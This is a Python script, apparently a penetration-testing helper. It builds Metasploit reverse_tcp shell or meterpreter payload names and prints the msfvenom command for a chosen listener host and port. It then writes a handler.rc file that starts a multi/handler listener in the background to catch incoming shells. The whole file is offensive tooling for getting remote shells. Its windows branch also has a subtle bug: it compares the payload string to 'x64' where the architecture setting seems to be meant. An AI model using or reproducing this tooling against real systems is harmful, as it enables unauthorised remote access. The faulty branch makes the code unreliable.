#!/usr/bin/env python3

import argparse

if __name__=="__main__":
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("--port", "--lport", help="LPORT", type=int, default=5566,
            dest="lport")
    parser.add_argument("-l", "--lhost", help="LHOST", required=True)
    parser.add_argument("--show", help="show msfvenom command", action="store_true", default=False)

    payload_group = parser.add_argument_group("payload options", "specify the full payload, or enter the other variables for it to be created automatically")
    payload_group.add_argument("-p", "--payload", help="payload to use")
    payload_group.add_argument("-t", "--platform", help="target platform for payload", choices=["linux", "windows"], default="linux")
    payload_group.add_argument("-a", "--arch", help="architecture to use for payload", choices=["x86", "x64"], default="x86")
    payload_group.add_argument("-s", "--staged", help="if set, use staged payload", action="store_true", default=False)
    payload_group.add_argument("-m", "--meterpreter", help="if set, use meterpreter payload", action="store_true", default=False)

    args = parser.parse_args()
    if args.payload:
        payload = args.payload
    else:
        payload = args.platform + "/"
        if args.platform == "linux":
            payload += args.arch + "/"
        else:
            if payload == "x64":
                payload += args.arch + "/"
        if args.meterpreter:
            payload += "meterpreter"
        else:
            payload += "shell"
        if args.staged:
            payload += "/"
        else:
            payload += "_"
        payload += "reverse_tcp"

    if args.show:
        cmd = f"msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport}"
        print(cmd)

    lines = list()
    lines.append("use multi/handler")
    lines.append(f"set payload {payload}")
    lines.append(f"setg LHOST {args.lhost}")
    lines.append(f"setg LPORT {args.lport}")
    lines.append(f"set LHOST {args.lhost}")
    lines.append(f"set LPORT {args.lport}")
    lines.append(f"set EXITONSESSION false")
    lines.append("exploit -jz")
    with open("handler.rc", "w") as handler:
        for line in lines:
            handler.write(line + "\n")

